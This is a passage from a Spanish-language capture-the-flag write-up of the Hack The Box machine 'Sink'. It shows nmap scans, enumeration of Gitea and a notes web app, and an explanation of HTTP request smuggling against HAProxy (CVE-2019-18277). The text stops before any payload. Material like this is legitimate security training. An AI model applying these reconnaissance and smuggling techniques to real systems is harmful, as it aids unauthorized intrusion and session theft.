      &lt;li&gt;&lt;a href=&quot;#final_vuln&quot;&gt;Robamos &lt;strong&gt;cookies&lt;/strong&gt; del usuario &lt;strong&gt;admin&lt;/strong&gt; explotando un &lt;strong&gt;HTTP Request Smuggling&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#web-notes&quot;&gt;Encontramos cositas siendo el usuario &lt;strong&gt;admin&lt;/strong&gt; en la web&lt;/a&gt;.&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#gitea-root&quot;&gt;Enumeramos el servicio del puerto &lt;strong&gt;3000&lt;/strong&gt; (&lt;strong&gt;Gitea&lt;/strong&gt;) como el usuario &lt;strong&gt;root&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#movimiento-lateral&quot;&gt;Movimiento Lateral (&lt;strong&gt;AWSecrets&lt;/strong&gt;)&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#escalada-de-privilegios&quot;&gt;Escalada de privilegios&lt;/a&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;reconocimiento&quot;&gt;Reconocimiento &lt;a href=&quot;#reconocimiento&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;enum-nmap&quot;&gt;Usamos &lt;u&gt;nmap&lt;/u&gt; para descubrir puertos abiertos &lt;a href=&quot;#enum-nmap&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Realizaremos un escaneo de puertos para saber que servicios esta corriendo la m√°quina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ nmap -p- --open -v 10.10.10.225 -oG initScan
&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Par√°metro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripci√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;-p-&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;‚Äìopen&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que est√©n abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-v&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-oG&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para usar una &lt;a href=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png&quot;&gt;funci√≥n &lt;strong&gt;extractPorts&lt;/strong&gt;&lt;/a&gt; de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; que me extrae los puertos en la clipboard&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ cat initScan 
# Nmap 7.80 scan initiated Wed Feb 17 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.225
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.225 ()   Status: Up
Host: 10.10.10.225 ()   Ports: 22/open/tcp//ssh///, 3000/open/tcp//ppp///, 5000/open/tcp//upnp///
# Nmap done at Wed Feb 17 25:25:25 2021 -- 1 IP address (1 host up) scanned in 90.06 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Perfecto, nos encontramos los puertos y servicios:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripci√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;&lt;a href=&quot;https://es.wikipedia.org/wiki/Secure_Shell&quot;&gt;SSH&lt;/a&gt;&lt;/strong&gt;: Tenemos la posibilidad de obtener una Shell de manera segura.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;3000&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;PPP&lt;/strong&gt;: No lo sabemos a√∫n.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5000&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;&lt;a href=&quot;https://www.speedguide.net/port.php?port=5000&quot;&gt;UPnP&lt;/a&gt;&lt;/strong&gt;: Conjunto de protocolos para la comunicaci√≥n de perif√©ricos en la red.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Hagamos un escaneo de scripts y versiones con base en cada servicio (puerto), con ello obtenemos informaci√≥n m√°s detallada de cada uno:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ nmap -p 22,3000,5000 -sC -sV 10.10.10.225 -oN portScan
&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Par√°metro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripci√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;-p&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneo de los puertos obtenidos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-sC&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Muestra todos los scripts relacionados con el servicio.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-sV&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Nos permite ver la versi√≥n del servicio.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-oN&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Obtenemos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;# Nmap 7.80 scan initiated Wed Feb 17 25:25:25 2021 as: nmap -p 22,3000,5000 -sC -sV -oN portScan 10.10.10.225
Nmap scan report for 10.10.10.225
Host is up (0.20s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=1f3e9a13ee13832b; Path=/; HttpOnly
|     Set-Cookie: _csrf=Aq4ydKpCQiIxK9nMLskgSeyGzwI6MTYxMzU3NjcxMDE1ODI4NzczNQ; Path=/; Expires=Thu, 18 Feb 2021 15:45:10 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Wed, 17 Feb 2021 15:45:10 GMT
|     &amp;lt;!DOCTYPE html&amp;gt;
|     &amp;lt;html lang=&quot;en-US&quot; class=&quot;theme-&quot;&amp;gt;
|     &amp;lt;head data-suburl=&quot;&quot;&amp;gt;
|     &amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;
|     &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&amp;gt;
|     &amp;lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&amp;gt;
|     &amp;lt;title&amp;gt; Gitea: Git with a cup of tea &amp;lt;/title&amp;gt;
|     &amp;lt;link rel=&quot;manifest&quot; href=&quot;/manifest.json&quot; crossorigin=&quot;use-credentials&quot;&amp;gt;
|     &amp;lt;meta name=&quot;theme-color&quot; content=&quot;#6cc644&quot;&amp;gt;
|     &amp;lt;meta name=&quot;author&quot; content=&quot;Gitea - Git with a cup of tea&quot; /&amp;gt;
|     &amp;lt;meta name=&quot;description&quot; content=&quot;Gitea (Git with a cup of tea) is a painless
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=4962a49b06cbe2fd; Path=/; HttpOnly
|     Set-Cookie: _csrf=VEhuM5Nh9ZTyY63RRBsfaoun5dI6MTYxMzU3NjcxNjE4MjM4NjQzMg; Path=/; Expires=Thu, 18 Feb 2021 15:45:16 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Wed, 17 Feb 2021 15:45:16 GMT
|     &amp;lt;!DOCTYPE html&amp;gt;
|     &amp;lt;html lang=&quot;en-US&quot; class=&quot;theme-&quot;&amp;gt;
|     &amp;lt;head data-suburl=&quot;&quot;&amp;gt;
|     &amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;
|     &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&amp;gt;
|     &amp;lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&amp;gt;
|     &amp;lt;title&amp;gt;Page Not Found - Gitea: Git with a cup of tea &amp;lt;/title&amp;gt;
|     &amp;lt;link rel=&quot;manifest&quot; href=&quot;/manifest.json&quot; crossorigin=&quot;use-credentials&quot;&amp;gt;
|     &amp;lt;meta name=&quot;theme-color&quot; content=&quot;#6cc644&quot;&amp;gt;
|     &amp;lt;meta name=&quot;author&quot; content=&quot;Gitea - Git with a cup of tea&quot; /&amp;gt;
|_    &amp;lt;meta name=&quot;description&quot; content=&quot;Gitea (Git with a c
5000/tcp open  http    Gunicorn 20.0.0
|_http-server-header: gunicorn/20.0.0
|_http-title: Sink Devops
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.80%I=7%D=2/17%Time=602D37C4%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,&quot;...&quot;);
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb 17 25:25:25 2021 -- 1 IP address (1 host up) scanned in 108.67 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Bien, tenemos varias cositas:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Puerto&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Servicio&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Versi√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;22&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;SSH&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;OpenSSH 8.2p1 Ubuntu 4ubuntu0.1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;3000&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;PPP (Al parecer HTTP)&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;ul&gt;
  &lt;li&gt;Tiene varias referencias hacia &lt;code&gt;Gitea&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Vemos 2 cookies y una relacionada a &lt;code&gt;gitea&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Puerto&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Servicio&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Versi√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;5000&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;HTTP&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Gunicorn 20.0.0&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Nada m√°s por ahora, as√≠ que empecemos a validar cada servicio y ver por donde podemos jugar‚Ä¶&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;enumeracion&quot;&gt;Enumeraci√≥n &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;puerto-3000&quot;&gt;Recorremos el puerto 3000 &lt;a href=&quot;#puerto-3000&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page3000.png&quot; alt=&quot;313page3000&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Listos, confirmamos el servicio &lt;code&gt;Gitea&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;ü¶† &lt;strong&gt;&lt;em&gt;B√°sicamente nos permite alojar control de versiones usando &lt;code&gt;Git&lt;/code&gt; y es un fork (copia) de &lt;a href=&quot;https://onthedock.github.io/post/171106-gogs-como-crear-tu-propio-servicio-de-hospedaje-de-repos-git/&quot;&gt;Gogs&lt;/a&gt; (que nos ayuda a correr nuestro propio servicio &lt;code&gt;Git&lt;/code&gt;, mejor dicho, tener nuestro propio &lt;u&gt;GitHub&lt;/u&gt;), pero mejorado y para toda la familia.&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://onthedock.github.io/post/180713-gitea-la-version-mejorada-de-gogs/&quot;&gt;&lt;strong&gt;Gitea&lt;/strong&gt;, la versi√≥n mejorada de &lt;strong&gt;Gogs&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://docs.gitea.io/en-us/comparison/&quot;&gt;Comparativa entre varios servicios de &lt;strong&gt;Git hosting&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Vale, entonces enumeremos a ver que sacamos‚Ä¶&lt;/p&gt;

&lt;p&gt;Si vamos al apartado &lt;code&gt;explore&lt;/code&gt; tenemos 3 √≠tems, veamos &lt;code&gt;users&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page3000_explore_users.png&quot; alt=&quot;313page3000_explore_users&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Usuario: &lt;code&gt;david&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Usuario: &lt;code&gt;marcus&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Usuario: &lt;code&gt;root&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Versi√≥n &lt;strong&gt;Gitea&lt;/strong&gt;: &lt;code&gt;1.12.6&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Versi√≥n &lt;strong&gt;Go&lt;/strong&gt;: &lt;code&gt;1.14.12&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Validando cada usuario, vemos que todos est√°n asociados a una organizaci√≥n, &lt;code&gt;Sink_Solutions&lt;/code&gt;, en &lt;strong&gt;Organizations&lt;/strong&gt; la encontramos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page3000_explore_organizations.png&quot; alt=&quot;313page3000_explore_organizations&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page3000_explore_organizations_sinksolutions.png&quot; alt=&quot;313page3000_explore_organizations_sinksolutions&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tambi√©n podemos logearnos, probando con los usuarios y posibles contrase√±as no conseguimos nada‚Ä¶&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page3000_signin.png&quot; alt=&quot;313page3000_signin&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Buscando vulnerabilidades con las versiones relacionadas encontramos una que posiblemente (no creo :P) est√© relacionada, pero debemos estar autenticados, guard√©mosla por si algo:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://bugs.gentoo.org/750686&quot;&gt;Gitea-1.12.6: Authenticated remote code execution via git hooks (CVE-2020-14144)&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;puerto-5000&quot;&gt;Recorremos el puerto 5000 &lt;a href=&quot;#puerto-5000&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;ü¶Ñ &lt;strong&gt;&lt;em&gt;&lt;code&gt;Gunicorn&lt;/code&gt; (Green Unicorn) is a &lt;u&gt;Python WSGI HTTP Server for UNIX&lt;/u&gt;. It‚Äôs a pre-fork worker model compatible with various web frameworks, simple and lightweight server.&lt;/em&gt;&lt;/strong&gt; &lt;a href=&quot;https://musyokaian.medium.com/server-side-template-injection-ssti-afa201f2afbb&quot;&gt;musyokaian&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Pero khe jeso de &lt;strong&gt;&lt;em&gt;WSGI&lt;/em&gt;&lt;/strong&gt;, r√°pidamente:&lt;/p&gt;

&lt;p&gt;‚öôÔ∏è &lt;strong&gt;&lt;em&gt;&lt;code&gt;WSGI&lt;/code&gt; permite que programas hechos en &lt;u&gt;Python&lt;/u&gt; puedan comunicarse a trav√©s del protocolo &lt;u&gt;HTTP&lt;/u&gt; sin ning√∫n tipo de framework o librer√≠a.&lt;/em&gt;&lt;/strong&gt; &lt;a href=&quot;https://codigofacilito.com/articulos/wsgi-python&quot;&gt;codigofacilito&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page5000.png&quot; alt=&quot;313page5000&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tenemos un login panel, pero tambi√©n nos podemos registrar, d√©mosle‚Ä¶&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page5000_signup.png&quot; alt=&quot;313page5000_signup&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page5000_home.png&quot; alt=&quot;313page5000_home&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Tenemos un correo: &lt;code&gt;admin@sink.htb&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Bien, pa que lo sepamos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page5000_home_whatisDevOps.png&quot; alt=&quot;313page5000_home_whatisDevOps&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En el apartado &lt;code&gt;notes&lt;/code&gt; nos permite agregar, ver y borrar notas:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page5000_notes.png&quot; alt=&quot;313page5000_notes&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page5000_notes_more.png&quot; alt=&quot;313page5000_notes_more&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Son notas que cree para probar algun tipo de injecci√≥n o brecha. Pero por el momento nada‚Ä¶&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;explotacion&quot;&gt;Explotaci√≥n &lt;a href=&quot;#explotacion&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;hr /&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#playing_with_vuln&quot;&gt;Jugando para entender la explotaci√≥n&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#final_vuln&quot;&gt;Explotaci√≥n final de algo muy lococh√≥n&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;playing_with_vuln&quot;&gt;Encontramos un vector de ataque muuuy potencial &lt;a href=&quot;#playing_with_vuln&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Bueno bueno bueeeeeeeeeeno‚Ä¶&lt;/p&gt;

&lt;p&gt;Despu√©s de dar vueltas por las p√°ginas con &lt;strong&gt;BurpSuite&lt;/strong&gt; interceptando las peticiones del servidor &lt;code&gt;http://10.10.10.25:5000&lt;/code&gt;, notamos algo llamativo:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313burp5000_home_haproxy_found.png&quot; alt=&quot;313burp5000_home_haproxy_found&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Esta usando un proxy llamado &lt;code&gt;HAProxy&lt;/code&gt; entre las peticiones, pues veamos que se trata:&lt;/p&gt;

&lt;p&gt;üöá &lt;strong&gt;&lt;em&gt;&lt;code&gt;HAProxy&lt;/code&gt; es un balanceador de cargas (load balancer: &lt;u&gt;transfiere peticiones entre host para evitar colapsos y hacer que sean procesadas m√°s r√°pido&lt;/u&gt;) entre servidores.&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=7ljiOD6MbLA&quot;&gt;YT - Balanceador de carga con &lt;strong&gt;HAProxy&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/HAProxy&quot;&gt;HAProxy en Wikipedia&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.redeszone.net/tutoriales/servidores/balanceador-carga-load-balancer-que-es-funcionamiento/&quot;&gt;Balanceadores de carga, mejora el rendimiento de tu web&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Teniendo esto claro, validemos si existen vulnerabilidades hacia ese servicio‚Ä¶&lt;/p&gt;

&lt;p&gt;Inicialmente nos encontramos con el CVE &lt;a href=&quot;https://www.cybersecurity-help.cz/vdb/SB2020040219&quot;&gt;CVE-2020-11100&lt;/a&gt;, el cual apoyado del protocolo &lt;code&gt;HTTP/2&lt;/code&gt; (para hacer un uso m√°s eficiente de los recursos en la red) puede permitirle al atacante enviar una petici√≥n ‚Äúespecial‚Äù, que puede generar un &lt;code&gt;heap-based buffer overflow&lt;/code&gt; y finalmente una ejecuci√≥n remota de comandos en el sistema.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://cwe.mitre.org/data/definitions/122.html&quot;&gt;Heap-based Buffer Overflow? - cwe.mitre.org&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://es.wikipedia.org/wiki/Desbordamiento_de_mont%C3%ADculo&quot;&gt;Desbordamiento de mont√≠culo (heap) - Wikipedia&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Es una vulnerabilidad descubierta por &lt;code&gt;Felix Wilhelm&lt;/code&gt; (integrante del grupo de hackers de &lt;strong&gt;Google&lt;/strong&gt; (&lt;code&gt;Project Zero&lt;/code&gt;)), en el blog oficial de &lt;code&gt;HAProxy&lt;/code&gt; nos redireccionan al writeup creado por √©l:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.haproxy.com/blog/haproxy-1-8-http-2-hpack-decoder-vulnerability-fixed/&quot;&gt;HAProxy Security Update HTTP/2 HPACK - haproxy.com&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://bugs.chromium.org/p/project-zero/issues/detail?id=2023&quot;&gt;HAProxy: out-of-bounds-write in HTTP/2 - bugs.chromium.org&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;D√°ndole vistazos a otros recursos y temas relacionados a esa vuln, no logre interactuar con ella‚Ä¶&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Buscando y buscando encontr√© un &lt;a href=&quot;https://www.youtube.com/watch?v=nq0ndhkfV_M&quot;&gt;PoC en formato de video&lt;/a&gt; explotando una vulnerabilidad llamada:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;HTTP Request Smuggling
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y que afecta a &lt;code&gt;HAProxy&lt;/code&gt;, esta tiene relacionado el CVE &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18277&quot;&gt;CVE-2019-18277&lt;/a&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=nq0ndhkfV_M&quot;&gt;YT - HTTP Request Smuggling explain on &lt;strong&gt;HAProxy CVE-2019-18277&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Antes de probar la vuln, entendamos (o intent√©moslo) sobre &lt;code&gt;HTTP Request Smuggling&lt;/code&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;what-is-smuggling&quot;&gt;¬øQu√© es un &lt;u&gt;HTTP Request Smuggling&lt;/u&gt;? (Descubr√°moslo) &lt;a href=&quot;#what-is-smuggling&quot;&gt;ü™ï&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Como indica &lt;a href=&quot;https://cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling&quot;&gt;&lt;strong&gt;Busra Demir&lt;/strong&gt; en su art√≠culo&lt;/a&gt;, &lt;code&gt;HTTP request smuggling&lt;/code&gt; es una t√©cnica la cual interfiere en el proceso por el que pasan las peticiones del front al back. Donde el atacante puede modificar la petici√≥n para incluir otra en la misma petici√≥n. Lo que pasara es que ejecutara la primera petici√≥n normalmente, pero al terminar de procesarla ejecutara la segunda que tenemos incrustada, logrando as√≠ el √©xito de la vulnerabilidad.&lt;/p&gt;

&lt;p&gt;Esto se logra &lt;strong&gt;modificando/agregando&lt;/strong&gt; &lt;u&gt;2 headers HTTP&lt;/u&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;* Content-Length Header: the size of the request body (in bytes).
* Transfer-Encoding Header: specified as chunked so that the request body will be sent in chunks (separated by newline). 0 is used to end a chunk.
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling&quot;&gt;&lt;strong&gt;Pentester guide to HTTP Request Smuggling&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Pero &lt;strong&gt;¬øpara qu√© nos sirve esto?&lt;/strong&gt; Como explica &lt;a href=&quot;https://portswigger.net/web-security/request-smuggling&quot;&gt;portswigger&lt;/a&gt; nos puede permitir &lt;u&gt;bypassear controles de seguridad&lt;/u&gt;, &lt;u&gt;obtener acceso a informaci√≥n sensible&lt;/u&gt; yyyy &lt;u&gt;comprometer otros usuarios que est√©n en la aplicaci√≥n&lt;/u&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313http_request_smuggling.svg&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
